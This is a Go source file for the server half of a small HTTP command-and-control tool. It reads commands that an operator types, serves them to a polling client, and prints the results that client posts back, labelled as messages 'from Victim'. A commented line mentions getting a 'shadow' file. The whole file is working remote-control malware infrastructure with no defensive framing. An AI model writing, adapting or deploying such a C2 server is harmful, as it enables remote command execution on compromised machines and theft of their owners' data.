package main

import (
	"bufio"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
)

type ServCommand struct {
	Command    string
	Commandres string
}

var commandtopost ServCommand
var servtemplate *template.Template

func init() {
	commandtopost = ServCommand{}
	servtemplate = template.Must(template.ParseFiles("templates/servtemplate.html"))
}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	//fmt.Println("Got shadow from ...")
	http.HandleFunc("/", index)
	err := http.ListenAndServe(":PORT", nil)
	checkerr(err)
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	if req.Method == "POST" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get("cmdres")
		commandtopost.Commandres = cmdres
		redc.Println("You have a message from Victim...")
		greenc.Println(commandtopost.Commandres)
		err = servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)

		//content, _ := ioutil.ReadAll(req.Body)
		//fmt.Println(string(content))
	} else {
		redc.Printf("<<http>>")
		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to client.")
		commandtopost.Command = cmdtopost
		err := servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)
	}
}
